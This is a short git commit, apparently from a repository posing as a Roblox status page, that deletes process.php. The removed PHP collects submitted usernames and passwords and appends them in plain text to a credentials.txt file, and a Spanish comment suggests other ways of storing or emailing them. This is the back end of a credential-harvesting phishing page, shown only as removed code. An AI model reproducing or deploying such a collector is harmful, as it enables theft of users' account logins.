68e0373a4cf7851de652f3d45eb45a4e7cbae129
RobloxStatus <tamirmarsou5@gmail.com>
2025-08-11 10:59:58 +0200

    Delete process.php

--- process.php
+++
@@ -1,9 +0,0 @@
-<?php
-if ($_SERVER["REQUEST_METHOD"] == "POST") {
-    $username = $_POST['username'];
-    $password = $_POST['password'];
-
-    // Aquí puedes guardar las credenciales en un archivo, base de datos, o enviarlas por correo electrónico
-    file_put_contents('credentials.txt', "Username: $username\nPassword: $password\n", FILE_APPEND);
-}
-?>
